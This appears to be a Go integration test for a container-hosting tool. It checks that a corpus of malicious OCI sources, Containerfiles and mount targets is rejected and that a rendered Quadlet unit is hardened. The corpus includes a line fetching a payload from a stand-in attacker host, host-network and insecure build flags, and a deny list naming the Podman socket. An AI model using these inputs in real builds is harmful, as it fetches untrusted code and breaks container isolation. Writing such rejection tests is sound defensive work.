// SPDX-License-Identifier: AGPL-3.0-or-later

//go:build linux && integration

package integration_test

import (
	"bytes"
	"encoding/json"
	"strings"
	"testing"

	"github.com/RTBGG/stackfort/internal/ociapps"
	"github.com/RTBGG/stackfort/internal/ocideployment"
	"github.com/RTBGG/stackfort/internal/ociimage"
)

func TestDisposableHostOCIMaliciousPolicyCorpus(t *testing.T) {
	requireDisposableRoot(t)
	digest := "sha256:" + strings.Repeat("0", 64)
	for _, source := range []ociapps.Source{
		{Kind: ociapps.SourceImageDigest, ImageReference: "docker.io/library/alpine:latest"},
		{Kind: ociapps.SourceImageDigest, ImageReference: "docker://docker.io/library/alpine@" + digest},
		{Kind: ociapps.SourceImageDigest, ImageReference: "docker.io/library/alpine@" + digest, BuildContext: "."},
		{Kind: ociapps.SourceContainerfile, BuildContext: "../escape", ContainerfilePath: "Containerfile"},
		{Kind: ociapps.SourceContainerfile, BuildContext: ".", ContainerfilePath: "/etc/Containerfile"},
	} {
		if _, err := ociapps.NormalizeSource(source); err == nil {
			t.Fatalf("malicious OCI source was accepted: %#v", source)
		}
	}

	base := "FROM docker.io/library/alpine@" + digest + "\n"
	for _, containerfile := range []string{
		base + "ADD https://attacker.invalid/payload /app\n",
		base + "RUN --network=host id\n",
		base + "RUN --security=insecure id\n",
		base + "RUN --mount=type=secret,id=token id\n",
		base + "ONBUILD RUN id\n",
		base + "VOLUME /host\n",
		base + "COPY --from=docker.io/library/busybox:latest /bin/sh /bin/sh\n",
	} {
		if err := ociimage.ValidateContainerfile([]byte(containerfile)); err == nil {
			t.Fatalf("malicious Containerfile was accepted:\n%s", containerfile)
		}
	}

	raw := []byte(`{"source":{"kind":"image_digest","imageReference":"docker.io/library/alpine@` + digest + `"},"internalPort":8080,"health":{"kind":"tcp","intervalSeconds":10,"timeoutSeconds":2,"retries":2},"privileged":true}`)
	decoder := json.NewDecoder(bytes.NewReader(raw))
	decoder.DisallowUnknownFields()
	var application ociapps.Spec
	if err := decoder.Decode(&application); err == nil {
		t.Fatal("unknown privileged field was accepted by the closed application schema")
	}
	for _, target := range []string{"/proc", "/sys/kernel", "/dev", "/run/podman/podman.sock"} {
		if _, err := ociapps.NormalizeVolumeMounts([]ociapps.VolumeMount{{
			VolumeID: mustIntegrationUUIDv7(t), ContainerPath: target,
		}}); err == nil {
			t.Fatalf("reserved container mount target was accepted: %s", target)
		}
	}

	identity := disposableIdentity(t, 249_999)
	deployment, err := ocideployment.Normalize(ocideployment.Spec{
		Identity: identity, ApplicationID: mustIntegrationUUIDv7(t), Revision: 1,
		ImageDigest: digest, ResourceDigest: digest, InternalPort: 8080, LoopbackPort: 20_000,
		Health: ociapps.HealthCheck{Kind: ociapps.HealthTCP, IntervalSeconds: 10, TimeoutSeconds: 2, Retries: 2},
	})
	if err != nil {
		t.Fatal(err)
	}
	quadlet, err := ocideployment.RenderQuadlet(deployment)
	if err != nil {
		t.Fatal(err)
	}
	content := string(quadlet.Content)
	for _, required := range []string{
		"PublishPort=127.0.0.1:20000:8080/tcp\n", "NoNewPrivileges=true\n",
		"DropCapability=all\n", "ReadOnly=true\n", "Pull=never\n",
	} {
		if !strings.Contains(content, required) {
			t.Fatalf("hardened Quadlet omitted %q:\n%s", required, content)
		}
	}
	for _, forbidden := range []string{"0.0.0.0", "Privileged", "Network=host", "/run/podman/podman.sock"} {
		if strings.Contains(content, forbidden) {
			t.Fatalf("hardened Quadlet contains forbidden token %q:\n%s", forbidden, content)
		}
	}
	t.Log("STACKFORT_QUALIFICATION oci-malicious-policy-corpus=passed")
}
